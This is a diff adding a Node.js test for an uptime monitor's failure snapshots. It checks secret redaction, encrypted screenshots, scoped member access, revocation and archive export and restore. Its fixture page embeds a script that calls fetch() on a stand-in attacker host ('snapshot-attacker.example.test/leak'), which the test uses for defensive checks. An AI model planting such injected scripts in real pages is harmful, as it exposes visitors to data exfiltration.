@@ -1,0 +1,49 @@
+// EVIDENCE-002: generated redacted pixels, scoped member access and complete portable incident reports.
+import {test} from 'node:test';
+import assert from 'node:assert/strict';
+import {randomBytes,randomUUID} from 'node:crypto';
+import {mkdir,writeFile} from 'node:fs/promises';
+import {join} from 'node:path';
+import {fixture} from './resilience/support.mjs';
+import {authRequest,deliveredLink,sessionCookie} from './auth-test-support.mjs';
+import {failurePageBrowser,failurePagePolicyBrowser,inviteEvidenceMember} from './failure-page-browser.mjs';
+
+test('owners capture safe failure pages, share only monitor evidence, export every artifact and revoke access',{timeout:120000},async()=>{
+ const f=await fixture(),previous=process.env.UPTIME_CREDENTIAL_DIR;let receiving;
+ try{
+  const token=randomBytes(24).toString('hex'),cookie=randomBytes(24).toString('hex'),email=randomUUID()+'@customer.example.test',order='order-'+randomUUID(),trace='trace-'+randomUUID();
+  f.modes.headers={'content-type':'text/html','set-cookie':`session=${cookie}`,'x-request-id':trace};
+  const encoded=token.split('').map(c=>'&#'+c.charCodeAt(0)+';').join('');
+  f.modes.body=`<h1>Checkout temporarily unavailable</h1><p>Upstream returned HTTP 503.</p><p>Authorization: Bearer ${token}</p><p>Cookie: session=${cookie}</p><p>${email}</p><p>${order}</p><p>Encoded credential: ${encoded}</p><p>Split credential: ${token.slice(0,12)}<span>${token.slice(12)}</span></p><script>fetch('https://snapshot-attacker.example.test/leak')</script><img src="https://snapshot-attacker.example.test/image">`;
+  const monitor=await f.monitor({name:'Harbor Shop checkout',runners:[f.first],canary:true,intervalMs:86400000,request:{credentialRef:'checkout-page'}}),directory=join(f.directory,'credentials');await mkdir(directory,{mode:0o700});process.env.UPTIME_CREDENTIAL_DIR=directory;
+  await writeFile(join(directory,'checkout-page.json'),JSON.stringify({monitorId:monitor.id,origin:`http://93.184.216.34:${f.port}`,auth:{type:'bearer',token},headers:{'x-correlation-id':trace,'x-auth-mirror':token}}),{mode:0o600});
+  const path=`/api/monitors/${monitor.id}/failure-snapshots`,policy={version:0,retentionDays:90,masks:[order],screenshot:true,safeValues:{requestHeaders:['user-agent','x-correlation-id','x-auth-mirror'],responseHeaders:['x-request-id'],email:false}};
+  assert.equal((await f.request(path,{method:'PATCH',body:policy})).status,200);
+  const task=await f.claim(f.first),observation=await f.evidence(task);assert.equal(observation.outcome,'target_failure');assert.equal(observation.failureSnapshot.screenshot.format,'png',JSON.stringify({screenshot:observation.failureSnapshot.screenshot.unavailable}));assert.equal(observation.failureSnapshot.responseHeaders['x-request-id'],trace);assert.ok(observation.failureSnapshot.requestHeaders['user-agent'].startsWith('uptime-node/'));assert.equal(observation.failureSnapshot.requestHeaders['x-correlation-id'],trace);assert.equal(observation.failureSnapshot.requestHeaders['x-auth-mirror'],'[redacted]','known credentials remain masked even in owner-marked safe headers');
+  for(const secret of [token,cookie,email,order])assert.ok(!JSON.stringify(observation.failureSnapshot).includes(secret));assert.ok(!observation.failureSnapshot.body.includes(encoded));assert.ok(!observation.failureSnapshot.body.includes(token.slice(0,12)));
+  assert.equal((await f.submit(f.first,task,[observation])).status,200);
+  const saved=(await f.request(path)).data.items[0],raw=(await f.DB.prepare('SELECT snapshot FROM failure_snapshots WHERE observation_id=?').bind(observation.id).first()).snapshot;assert.ok(!raw.includes(saved.snapshot.screenshot.data),'D1 retains no plaintext pixels');assert.ok(JSON.parse(raw).screenshot.ciphertext);
+  const incident=(await f.request(`/api/monitors/${monitor.id}/incidents`)).data[0],report=(await f.request(`/api/incidents/${incident.trigger.id}/failure-report`)).data;assert.equal(report.failureSnapshots.items.length,1);assert.equal(report.failureSnapshots.more,false);assert.equal(report.failureSnapshots.items[0].snapshot.screenshot.data,saved.snapshot.screenshot.data);
+  const call=authRequest(f.origin),memberEmail=randomUUID()+'@operators.example.test';
+  await inviteEvidenceMember(f,monitor,{email:memberEmail,displayName:'Jamie · support'});
+  const link=await deliveredLink(call,{email:memberEmail,kind:'invite'}),confirmed=await call('/auth/confirm',{token:link.searchParams.get('token')});const memberCookie=sessionCookie(confirmed);
+  const operators=(await f.request('/auth/operators')).data,member=operators.find(o=>o.email===memberEmail);assert.ok(member);
+  const viewer=`/api/evidence/monitors/${monitor.id}`;
+  const memberRead=async(path,method='GET',body)=>fetch(f.origin+path,{method,redirect:'manual',headers:{cookie:memberCookie,origin:f.origin,'content-type':'application/json'},...(body?{body:JSON.stringify(body)}:{})});
+  assert.equal((await fetch(f.origin+viewer)).status,401);assert.equal((await memberRead(viewer)).status,403);assert.equal((await memberRead(path)).status,401);
+  assert.equal((await f.request(`/api/monitors/${monitor.id}/evidence-access`,{body:{operatorId:member.id,granted:true}})).status,200);assert.equal((await memberRead(viewer)).status,200);assert.equal((await memberRead('/api/archive')).status,401);assert.equal((await memberRead(path,'PATCH',policy)).status,401);
+  const other=await f.monitor({name:'Unshared account API',enabled:false,runners:[f.first],canary:true});assert.equal((await memberRead(`/api/evidence/monitors/${other.id}`)).status,403);
+  const archiveResponse=await f.request('/api/archive');assert.equal(archiveResponse.status,200,JSON.stringify(archiveResponse.data));const archive=archiveResponse.data;assert.equal(archive.payload.productTables.failure_snapshots[0].snapshot.includes('ciphertext'),false);receiving=await fixture({SESSION_SECRET:randomBytes(32).toString('base64url')});assert.equal((await receiving.request('/api/restore',{body:{archive}})).status,200);assert.equal((await receiving.request(path)).data.items[0].snapshot.screenshot.data,saved.snapshot.screenshot.data);assert.equal((await receiving.DB.prepare('SELECT COUNT(*) n FROM failure_evidence_grants').first()).n,0);assert.equal((await receiving.request('/api/archive')).data.payload.productTables.failure_snapshots[0].snapshot,archive.payload.productTables.failure_snapshots[0].snapshot);const erased=await receiving.request(`/api/monitors/${monitor.id}/erase`,{body:{name:monitor.definition.name}});assert.equal(erased.status,200);assert.equal(erased.data.receipt.counts.failure_snapshots,1);await receiving.close();receiving=null;
+  const state=(await f.DB.prepare('SELECT state FROM monitors WHERE id=?').bind(monitor.id).first()).state;
+  await failurePageBrowser(f,monitor,{memberCookie,memberId:member.id,outputImage:saved.snapshot.screenshot.data});
+  assert.equal((await memberRead(viewer)).status,403,'revocation immediately fences an existing session');assert.equal((await f.DB.prepare('SELECT state FROM monitors WHERE id=?').bind(monitor.id).first()).state,state);
+  const settings=(await f.request(path)).data.settings;assert.equal((await f.request(path,{method:'PATCH',body:{...settings,safeValues:{...settings.safeValues,requestHeaders:['authorization']}}})).status,400);
+  const allowed=await f.request(path,{method:'PATCH',body:{...settings,safeValues:{...settings.safeValues,email:true}}});assert.equal(allowed.status,200);assert.equal((await f.request(path)).data.items[0].snapshot.screenshot.unavailable,'policy_changed');
+  assert.equal((await f.request(`/api/monitors/${monitor.id}/run`,{body:{}})).status,200);const manual=await f.claim(f.first),next=await f.evidence(manual);assert.ok(next.failureSnapshot.body.includes(email),JSON.stringify({taskEmail:manual.snapshotPolicy.safeValues.email,snapshotEmail:next.failureSnapshot.safeValues?.email,bodyPresent:Boolean(next.failureSnapshot.body),outcome:next.outcome,assertion:next.checks[0].assertion,status:next.status,snapshotStatus:next.failureSnapshot.status,captureUnavailable:next.failureSnapshot.unavailable,hasRedaction:next.failureSnapshot.body?.includes('[redacted]')}));const tightened=await f.request(path,{method:'PATCH',body:{...allowed.data,safeValues:{...allowed.data.safeValues,email:false}}});assert.equal(tightened.status,200);assert.equal((await f.submit(f.first,manual,[next])).status,200);const latest=(await f.request(path)).data.items[0].snapshot;assert.ok(!latest.body.includes(email));assert.equal(latest.screenshot.unavailable,'policy_changed','an in-flight screenshot cannot bypass tightened redaction');await failurePagePolicyBrowser(f,monitor);
+  const expected=new Set([observation.id,next.id]);const capturePolicy=(await f.request(path)).data.settings;assert.equal((await f.request(path,{method:'PATCH',body:{...capturePolicy,screenshot:false}})).status,200);
+  for(let i=0;i<20;i++){assert.equal((await f.request(`/api/monitors/${monitor.id}/run`,{body:{}})).status,200);const task=await f.claim(f.first),attempt=await f.evidence(task);assert.equal((await f.submit(f.first,task,[attempt])).status,200);expected.add(attempt.id)}
+  const selection=(await f.request(path)).data;assert.ok(selection.items.length<expected.size);assert.ok(selection.next);const complete=(await f.request(`/api/incidents/${incident.trigger.id}/failure-report`)).data;assert.deepEqual(new Set(complete.failureSnapshots.items.map(row=>row.observation_id)),expected);assert.equal(complete.failureSnapshots.more,false);
+  
+  const outbox=(await f.DB.prepare('SELECT event FROM outbox').all()).results;assert.ok(outbox.every(row=>!row.event.includes('<h1>')&&!row.event.includes('base64')&&!row.event.includes(token)));
+ }finally{if(previous===undefined)delete process.env.UPTIME_CREDENTIAL_DIR;else process.env.UPTIME_CREDENTIAL_DIR=previous;await receiving?.close();await f.close()}
+});
